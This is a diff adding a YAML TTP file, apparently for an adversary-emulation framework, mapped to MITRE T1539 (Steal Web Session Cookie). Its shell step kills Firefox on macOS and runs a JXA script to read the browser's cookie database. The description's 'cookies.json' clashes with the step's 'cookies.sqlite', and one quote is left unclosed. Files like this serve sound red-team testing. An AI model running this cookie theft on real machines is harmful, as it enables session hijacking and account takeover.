@@ -1,0 +1,23 @@
+---
+name: If Firefox is installed, dump cookie values.
+description: |
+  This TTP will simply read from the cookies.json file if Firefox is installed.
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1539 Steal Web Session Cookie
+steps:
+  - name: dump-cookies
+    inline: |
+      echo -e "First, checking to see if Firefox is installed..."
+      if [ -d /Applications/Firefox.app ]; then
+         echo "[+] Firefox is installed...
+         Attempting to kill Firefox and read from cookies.sqlite db..."
+         pkill -a -i "Firefox"
+         pkill -a -i "Firefox"
+         osascript JXA-Firefox.js
+         echo "[+] TTP Done!"
+      else
+         echo "[-] Firefox is not present on this system. Exiting..."
+      fi
